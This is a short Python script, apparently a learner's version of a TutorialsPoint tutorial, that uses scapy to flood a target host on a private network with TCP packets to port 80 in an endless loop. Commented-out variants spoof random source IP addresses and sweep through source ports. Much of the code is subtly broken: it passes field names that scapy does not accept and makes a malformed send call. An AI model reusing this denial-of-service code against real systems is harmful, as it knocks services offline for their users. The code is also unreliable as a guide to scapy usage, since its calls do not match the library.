import random
from scapy.all import *
import socket


#source_IP = input("Enter IP address of Source: ")
source_IP = '192.168.1.79'
#target_IP = input("Enter IP address of Target: ")
target_IP = '192.168.1.93'
#source_port = int(input("Enter Source Port Number:"))
source_port = 80

i = 1

while True:
   IP1 = IP(source_IP = source_IP, destination = target_IP)
   TCP1 = TCP(srcport = source_port, dstport = 80)
   pkt = IP1 / TCP1
   send(pkt, inter = .001)
   
   print ("packet sent ", i)
   i = i + 1

##################################################################################
#try 2 multiple IP&ports to multiple ports one ip

# #target_IP = input("Enter IP address of Target: ")
# target_IP = '192.168.1.93'
# i = 1

# while True:
#    a = str(random.randint(1,254))
#    b = str(random.randint(1,254))
#    c = str(random.randint(1,254))
#    d = str(random.randint(1,254))
#    dot = '.'
#    source_ip = a + dot + b + dot + c + dot + d
#    print(source_ip)
   
#    for source_port in range(1024, 65535):
#       IP1 = IP(source_ip = source_ip, destination = target_IP)
#       TCP1 = TCP(srcport = source_port, dstport = 80)
#       pkt = IP1 / TCP1
#       send(pkt,inter = .001)
      
#       print ("packet sent ", i)
#       i = i + 1

##################################################################################
#try 1
#Defining the Source ip, Target-IP, and SourcePorts
# print("hello")
# #sourceDevice_IP = input("Enter the IPv4 address of the source device: ")
# sourceDevice_IP = '192.168.1.79'
# #targetDevice_IP = input("Enter the IPv4 address of the target device: ")
# targetDevice_IP = '192.168.1.93'
# #source_port = int(input("Enter the SOurce port number: "))
# source_port = 80

# #i will keep incrementing as each packet is sent
# i = 1

# while True:
#     IP1 = IP(sourceDevice_IP = sourceDevice_IP, destination = targetDevice_IP)
#     TCP1 = TCP(srcport = source_port, dstport = 80)
#     packet(packet, interval = .001)

#     print("Packet sent", i)
#     i = i +1




#code credit: https://www.tutorialspoint.com/python_penetration_testing/python_penetration_testing_dos_and_ddos_attack.htm

